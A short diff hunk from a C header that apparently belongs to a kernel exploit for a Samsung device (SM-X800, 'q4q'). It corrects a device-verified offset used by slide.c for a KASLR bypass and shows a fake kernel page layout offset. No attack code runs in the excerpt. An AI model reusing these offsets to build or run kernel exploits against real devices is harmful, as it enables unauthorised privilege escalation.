@@ -211,7 +211,7 @@
  * Used by slide.c to match trace event callers during KASLR bypass.
  * Device-verified on q4q.
  */
-#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x00112738ULL   /* SM-X800 worker_thread+0x1b0, ret after bl schedule_timeout */
+#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x00180b1fcULL   /* SM-X800 schedule_timeout+0x44, wchan ret after bl schedule */
 
 /* ---- Fake page layout offsets (within the 32KB order-3 kernel page) ---- */
 #define LOCK_OFF    0x1350
